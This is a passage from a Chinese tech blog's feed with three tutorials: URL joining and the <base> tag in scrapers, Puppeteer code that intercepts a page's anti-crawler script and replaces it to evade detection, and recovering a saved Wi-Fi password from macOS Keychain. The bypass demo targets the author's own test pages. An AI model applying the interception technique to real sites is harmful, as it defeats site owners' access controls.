class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试相对路径<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>书籍列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/book/1.html"</span>&gt;</span>第一本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/book/2.html"</span>&gt;</span>第二本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/book/3.html"</span>&gt;</span>第三本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/book/4.html"</span>&gt;</span>第四本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/book/5.html"</span>&gt;</span>第五本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行效果如下图所示，用XPath只能提取到半截URL：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107190417.png" alt></p><p>但是浏览器可以正确识别这样的相对地址，并且当你点击的时候，它能自动跳转到正确的地址：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107190616.png" alt></p><p>相对路径如果是以<code>/</code>开头，那么就会在相对路径前面拼接上网站的主域名。</p><p>但如果当前列表页的地址跟链接的相对路径有一部分重叠怎么办？如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107190934.png" alt></p><p>当前页面的地址是<code>http://127.0.0.1:8000/book</code>。而相对地址是<code>/book/1.html</code>。这种情况下，还可以进一步简化，在相对路径的前面不要加斜杠，把HTML改成：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试相对路径<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>书籍列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"1.html"</span>&gt;</span>第一本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"2.html"</span>&gt;</span>第二本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"3.html"</span>&gt;</span>第三本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"4.html"</span>&gt;</span>第四本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"5.html"</span>&gt;</span>第五本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107191249.png" alt></p><p>这种情况下，浏览器依然能给正确识别，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220107191347.png" alt></p><p>浏览器知道，如果相对路径没有用<code>/</code>开头，那么它就会把当前页面的URL与相对路径拼接起来。但需要注意的是，在拼接的时候，会取最右侧斜杠左边的部分。而右边的部分会丢弃。就相当于拼接文件地址的时候，用这个文件所在的文件夹来拼接新的地址。如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220108203350.png" alt></p><p>如果你记不住怎么区分的话，你可以使用Python自带的<code>urllib.parse.urljoin</code>来连接，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220108203722.png" alt></p><p>看到这里，你可能觉得我今天又水了一篇文章。这么简单的东西也值得写一篇文章来讲？</p><p>那么我们来看下面这个例子：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/20220108204350.png" alt></p><p>域名是<code>http://127.0.0.1:8000/book/index.html</code>，相对域名是<code>1.html</code>，但为什么浏览器自动识别出来的URL是<code>www.kingname.info/1.html</code>？</p><p>这个问题的关键，在于源代码里面的<base>标签：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试相对路径<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"http://www.kingname.info"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>书籍列表<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"1.html"</span>&gt;</span>第一本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"2.html"</span>&gt;</span>第二本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"3.html"</span>&gt;</span>第三本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"4.html"</span>&gt;</span>第四本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"5.html"</span>&gt;</span>第五本书<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果HTML代码头部有<base>标签，那么，它的<code>href</code>属性的值，会被用来跟相对路径拼接出一个绝对路径，而不会再用当前页面的URL来拼接。</p><p>如果你不知道这一点的话，你的爬虫在拼接子页面URL的时候可能就会出问题。网站也可以使用这个机制构造出一个蜜罐，根据<base>标签拼出来的URL才是真正的子页面地址，而用当前页面URL去拼接的URL是蜜罐地址，爬虫访问进去以后，就会抓到假数据，或者被立即屏蔽。</p><p>关于<base>标签的详细说明，大家可以阅读：<a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base" target="_blank" rel="noopener"><base>: The Document Base URL element</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在写爬虫的过程中，我们经常需要解析网站的列表页。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：在 Puppeteer 中如何拦截并修改网站的 JavaScript 代码</title>
    <link href="https://www.kingname.info/2022/01/18/mitm-in-puppeteer/"/>
    <id>https://www.kingname.info/2022/01/18/mitm-in-puppeteer/</id>
    <published>2022-01-18T13:03:20.000Z</published>
    <updated>2022-01-18T13:04:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>在我的爬虫书中，讲到了使用 Charles 或者 MitmProxy 实现中间人攻击，从而绕过反爬虫机制的方法。但这两种方法都需要安装根证书。</p><p>今天，我们来试一试在 Puppeteer 中，使用中间人攻击，攻击目标是我们自己，来绕过反爬虫机制。</p><a id="more"></a><p>首先，我们用以下代码访问网站<code>http://exercise.kingname.info/exercise_ajax_1.html</code>：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">        executablePath: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>,</span><br><span class="line">        headless:<span class="literal">false</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> [page] = <span class="keyword">await</span> browser.pages()</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'http://exercise.kingname.info/exercise_ajax_1.html'</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-19-57-05.png" alt></p><p>现在，我想拦截网站返回的数据，并篡改它。首先我们打开 Chrome 的开发者工具，看看这个页面有哪些 Ajax 请求：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-19-58-54.png" alt></p><p>红框框住的这个 Ajax 请求，返回了网页上面的文字。这个请求对应的地址是：<code>http://exercise.kingname.info/ajax_1_backend</code>，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-19-59-51.png" alt></p><p>现在，我们就来尝试篡改这个请求的返回数据。首先使用<code>npm</code>安装一个包：<code>npm install puppeteer-interceptor</code>。然后修改代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; intercept, patterns &#125; = <span class="built_in">require</span>(<span class="string">'puppeteer-interceptor'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">        executablePath: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>,</span><br><span class="line">        headless:<span class="literal">false</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> [page] = <span class="keyword">await</span> browser.pages();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    intercept(page, patterns.XHR(<span class="string">'*ajax_1_backend'</span>), &#123;</span><br><span class="line">        onResponseReceived: <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;event.request.url&#125;</span> intercepted, going to modify`</span>)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">`You are hacked by me`</span>;</span><br><span class="line">            event.response.body = content;</span><br><span class="line">            <span class="keyword">return</span> event.response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'http://exercise.kingname.info/exercise_ajax_1.html'</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-20-06-35.png" alt></p><p>其中关键的代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">intercept(page, patterns.XHR(<span class="string">'*ajax_1_backend'</span>), &#123;</span><br><span class="line">        onResponseReceived: <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;event.request.url&#125;</span> intercepted, going to modify`</span>)</span><br><span class="line">            <span class="keyword">var</span> content = <span class="string">`You are hacked by me`</span>;</span><br><span class="line">            event.response.body = content;</span><br><span class="line">            <span class="keyword">return</span> event.response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>这一段代码指定，要修改一个 XHR 请求的返回。这个 XHR 请求的 URL 是以<code>ajax_1_backend</code>结尾的。所谓的 XHR 请求，全称是<code>XMLHttpRequest</code>，大家可以把它近似看做 Ajax 请求。</p><p>当检测到满足这个通配符的请求时，无论它的内容是什么，都改写成<code>You are hacked by me</code>，然后返回给浏览器。</p><p>有人可能会问，你这样修改，简单是简单，但它有什么用呢？它的用处非常大，比如你在做爬虫的时候，把网站的 JavaScript 的一部分代码替换了，这样就能绕过反爬虫检测。</p><p>我做了一个示例的页面来说明。这个页面直接访问，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-20-26-57.png" alt></p><p>使用开发者工具，我们可以看到核心的反爬虫逻辑在<code>http://127.0.0.1:8000/backend.js</code>这个 js 文件中，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-20-29-35.png" alt></p><p>这个演示的例子中，这个反爬虫函数非常简单。但在真实的场景中，它的逻辑非常复杂。然而，逻辑再复杂，也有个调用入口。简单分析这个JavaScript 代码，我们可以知道，只需要把代码第14行注释掉，强制设置<code>is_spider = false</code>，就可以绕过这个反爬虫逻辑了。</p><p>为了绕过反爬虫逻辑，首先，我们把网站的这个JavaScript 代码复制下来，保存成<code>safe.js</code>文件。然后修改里面的代码，绕过反爬虫逻辑：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">antispider</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'开始检测爬虫'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'开始收集浏览器指纹'</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'开始检查是否是模拟浏览器'</span>);</span><br><span class="line">    <span class="keyword">if</span> (a + b === <span class="number">3</span>) &#123;  <span class="comment">// 是爬虫！</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">is_spider = <span class="literal">false</span>;  <span class="comment">//这里强制写成 false</span></span><br><span class="line"><span class="keyword">if</span>(is_spider) &#123;</span><br><span class="line">    alert(<span class="string">'你是爬虫！'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"content"</span>).innerHTML = <span class="string">"In America, leave airplane, inner People, related to the benefit, know everything, know nothing, said nothing, above."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，修改 Puppeteer 的代码，从本地读取这个修改后的 js 文件，然后拦截真正的请求并使用修改后的代码替换：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer-core'</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; intercept, patterns &#125; = <span class="built_in">require</span>(<span class="string">'puppeteer-interceptor'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> safe_code = fs.readFileSync(<span class="string">'./safe.js'</span>, <span class="string">'utf8'</span>);</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(&#123;</span><br><span class="line">        executablePath: <span class="string">'/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge'</span>,</span><br><span class="line">        headless:<span class="literal">false</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> [page] = <span class="keyword">await</span> browser.pages();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    intercept(page, patterns.Script(<span class="string">'*backend.js'</span>), &#123;</span><br><span class="line">        onResponseReceived: <span class="function"><span class="params">event</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;event.request.url&#125;</span> intercepted, going to modify`</span>)</span><br><span class="line">            event.response.body = safe_code;</span><br><span class="line">            <span class="keyword">return</span> event.response;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">await</span> page.goto(<span class="string">'http://127.0.0.1:8000'</span>);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>运行效果如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-05-20-57-28.png" alt></p><p>从图中可以看到，我们成功绕过了反爬虫的逻辑，获得了真正的页面数据。</p><p>这里有两个地方需要注意：</p><ol><li>要拦截哪个请求，对应到的是<code>intercept</code>函数的第二个参数。这个参数的值是<code>patterns.XXX(地址通配符)</code>。其中的 XXX 可以是如下几个关键词：<code>Document, Stylesheet, Image, Media, Font, Script, TextTrack, XHR, Fetch, EventSource, WebSocket, Manifest, SignedExchange, Ping, CSPViolationReport, Preflight, Other</code>。地址通配符注意是<code>通配符</code>不是正则表达式。通配符里面，<code>*</code>表示多个字符，<code>?</code>表示一个字符。</li><li><code>puppeteer-interceptor</code>对中文的支持不太好。拦截到请求返回的数据以后，如果要修改文本，尽量修改成英文的。否则可能会报错。</li></ol><p><code>puppeteer-interceptor</code>不仅可以修改返回的内容，还可以修改网站的请求。更多强大功能，大家可以阅读它的<a href="https://www.npmjs.com/package/puppeteer-interceptor" target="_blank" rel="noopener">官方文档</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在我的爬虫书中，讲到了使用 Charles 或者 MitmProxy 实现中间人攻击，从而绕过反爬虫机制的方法。但这两种方法都需要安装根证书。&lt;/p&gt;
&lt;p&gt;今天，我们来试一试在 Puppeteer 中，使用中间人攻击，攻击目标是我们自己，来绕过反爬虫机制。&lt;/p&gt;
    
    </summary>
    
      <category term="爬虫" scheme="https://www.kingname.info/categories/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://www.kingname.info/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="中间人攻击" scheme="https://www.kingname.info/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
      <category term="Puppeteer" scheme="https://www.kingname.info/tags/Puppeteer/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：macOS如何找回已经连接的Wi-Fi密码？</title>
    <link href="https://www.kingname.info/2022/01/18/find-password/"/>
    <id>https://www.kingname.info/2022/01/18/find-password/</id>
    <published>2022-01-18T13:02:04.000Z</published>
    <updated>2022-01-18T13:02:55.000Z</updated>
    
    <content type="html"><![CDATA[<p>我们知道，iPhone之间，iPhone和macOS之间是可以一键分享Wi-Fi密码的。只要有一台手机连了Wi-Fi，那么当第二台手机要连Wi-Fi的时候，只要第一台手机在旁边，就会自动弹出一个是否分享Wi-Fi密码的提示，从而一键分享。</p><p>我的macOS两年前连过父母家的Wi-Fi。后来又通过它的分享功能让iPhone也连上了Wi-Fi。所以两年过去了，Wi-Fi密码早就忘记了。</p><p>现在，我想让一台安卓手机连上这个Wi-Fi应该怎么办呢？</p><a id="more"></a><p>首先尝试了暴力破解。我试了所有我能想到的密码，均告失败。</p><p>接下来我尝试登陆路由器后台，试图从路由器管理页面找到密码。但我发现路由器管理密码也忘记了。</p><p>如果不重置路由器，还有什么办法找回密码呢？</p><p>其实macOS是有办法查到已经连过的Wi-Fi的明文密码，方法非常简单。</p><p>首先在启动台中，找到一个叫做<code>钥匙串访问</code>的功能，如下图所示。</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-03-10-23-30.png" alt></p><p>选择<code>系统</code>-<code>密码</code>，然后找到 Wi-Fi的名字，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-03-10-25-15.png" alt></p><p>在Wi-Fi 名字上右键，选择<code>将密码拷贝到剪贴板</code>，并输入电脑的账号和密码，如下图所示：</p><p><img src="https://kingname-1257411235.cos.ap-chengdu.myqcloud.com/2022-01-03-10-26-45.png" alt></p><p>然后找任何一个可以打字的输入框，粘贴一下，就知道密码是什么了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们知道，iPhone之间，iPhone和macOS之间是可以一键分享Wi-Fi密码的。只要有一台手机连了Wi-Fi，那么当第二台手机要连Wi-Fi的时候，只要第一台手机在旁边，就会自动弹出一个是否分享Wi-Fi密码的提示，从而一键分享。&lt;/p&gt;
&lt;p&gt;我的macOS两年前连过父母家的Wi-Fi。后来又通过它的分享功能让iPhone也连上了Wi-Fi。所以两年过去了，Wi-Fi密码早就忘记了。&lt;/p&gt;
&lt;p&gt;现在，我想让一台安卓手机连上这个Wi-Fi应该怎么办呢？&lt;/p&gt;
    
    </summary>
    
      <category term="技巧" scheme="https://www.kingname.info/categories/%E6%8A%80%E5%B7%A7/"/>
    
    
      <category term="技巧" scheme="https://www.kingname.info/tags/%E6%8A%80%E5%B7%A7/"/>
    
      <category term="macOS" scheme="https://www.kingname.info/tags/macOS/"/>
    
  </entry>
  
  <entry>
    <title>一日一技：全文搜索、频率限制、带过期时间的缓存怎么做？</title>
    <link href="https://www.kingname.info/2022/01/03/walrus/"/>
    <id>https://www.kingname.info/2022/01/03/walrus/</id>
    <published>2022-01-03T02:34:04.000Z</published>
    <updated>2022-01-03T02:35:06.580Z</updated>
    
